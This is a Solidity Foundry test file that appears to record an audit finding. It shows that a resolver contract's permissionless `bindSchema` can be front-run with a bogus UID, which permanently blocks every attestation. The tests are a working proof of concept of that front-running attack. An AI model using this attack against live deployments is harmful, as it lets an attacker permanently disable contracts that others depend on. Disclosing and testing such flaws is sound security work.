// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {Test, console2} from "forge-std/Test.sol";
import {EAS} from "@ethereum-attestation-service/eas-contracts/contracts/EAS.sol";
import {
    IEAS,
    AttestationRequest,
    AttestationRequestData
} from "@ethereum-attestation-service/eas-contracts/contracts/IEAS.sol";
import {
    ISchemaRegistry,
    SchemaRegistry
} from "@ethereum-attestation-service/eas-contracts/contracts/SchemaRegistry.sol";
import {ISchemaResolver} from "@ethereum-attestation-service/eas-contracts/contracts/resolver/ISchemaResolver.sol";
import {EASIndexerResolver} from "src/eas/resolvers/EASIndexerResolver.sol";
import {SchemaRegistrar} from "src/eas/SchemaRegistrar.sol";

/// FINDING: `EASIndexerResolver.bindSchema` is permissionless, one-shot, and validates NOTHING
/// about the UID it is handed — not that the schema exists, not that its resolver is this
/// contract. The doc comment argues the call is safe because "the caller cannot choose a UID that
/// belongs to anyone else's instance"; the attack does not need a valid UID. Every script-based
/// deployment (`DeployNetwork.s.sol`, `DeployEasResolver.s.sol`) broadcasts the resolver
/// deployment and the `bindSchema` call as SEPARATE transactions, so a watcher can bind garbage in
/// between and permanently wedge the resolver: `_requireBoundSchema` then rejects every real
/// attestation, and the accumulator can never receive another edge.
contract OmegaPassB_BindSchemaFrontRun is Test {
    string internal constant VOUCH_SCHEMA = "string comment,uint256 confidence";

    EAS internal eas;
    SchemaRegistry internal schemaRegistry;
    SchemaRegistrar internal registrar;

    address internal deployer = address(0xD1);
    address internal attacker = address(0xBAD);
    address internal alice = address(0xA11CE);

    function setUp() public {
        schemaRegistry = new SchemaRegistry();
        eas = new EAS(ISchemaRegistry(address(schemaRegistry)));
        registrar = new SchemaRegistrar(ISchemaRegistry(address(schemaRegistry)));
    }

    function test_HonestDeploymentWorks() public {
        vm.prank(deployer);
        EASIndexerResolver resolver = new EASIndexerResolver(IEAS(address(eas)));
        bytes32 uid = registrar.register(VOUCH_SCHEMA, ISchemaResolver(address(resolver)), true);
        vm.prank(deployer);
        resolver.bindSchema(uid);

        vm.prank(alice);
        eas.attest(
            AttestationRequest({
                schema: uid,
                data: AttestationRequestData({
                    recipient: address(0xBEEF),
                    expirationTime: 0,
                    revocable: true,
                    refUID: bytes32(0),
                    data: abi.encode("hi", uint256(50)),
                    value: 0
                })
            })
        );
        assertEq(resolver.leafCount(), 1, "edge folded");
    }

    function test_AttackerBindsGarbageAndBricksTheResolver() public {
        // tx 1 of the deploy script: the resolver is deployed.
        vm.prank(deployer);
        EASIndexerResolver resolver = new EASIndexerResolver(IEAS(address(eas)));

        // tx 2 of the deploy script: the schema is registered (the honest UID).
        bytes32 uid = registrar.register(VOUCH_SCHEMA, ISchemaResolver(address(resolver)), true);

        // --- the attacker slips in here, before the script's `bindSchema` lands ---------------
        vm.prank(attacker);
        resolver.bindSchema(bytes32(uint256(0xDEAD))); // a UID that does not exist anywhere
        assertEq(resolver.boundSchema(), bytes32(uint256(0xDEAD)));

        // The deploy script's own bindSchema now reverts: the deployment aborts.
        vm.prank(deployer);
        vm.expectRevert(EASIndexerResolver.SchemaAlreadyBound.selector);
        resolver.bindSchema(uid);

        // And the resolver is permanently unusable: EVERY attestation on its schema reverts.
        vm.prank(alice);
        vm.expectRevert();
        eas.attest(
            AttestationRequest({
                schema: uid,
                data: AttestationRequestData({
                    recipient: address(0xBEEF),
                    expirationTime: 0,
                    revocable: true,
                    refUID: bytes32(0),
                    data: abi.encode("hi", uint256(50)),
                    value: 0
                })
            })
        );
        assertEq(resolver.leafCount(), 0, "no edge can ever be folded");
    }

    /// The bound UID need not exist, need not name this resolver, and need not be a schema at all.
    function test_BindSchemaValidatesNothing() public {
        EASIndexerResolver resolver = new EASIndexerResolver(IEAS(address(eas)));
        resolver.bindSchema(keccak256("literally anything"));
        assertEq(resolver.boundSchema(), keccak256("literally anything"));
    }
}
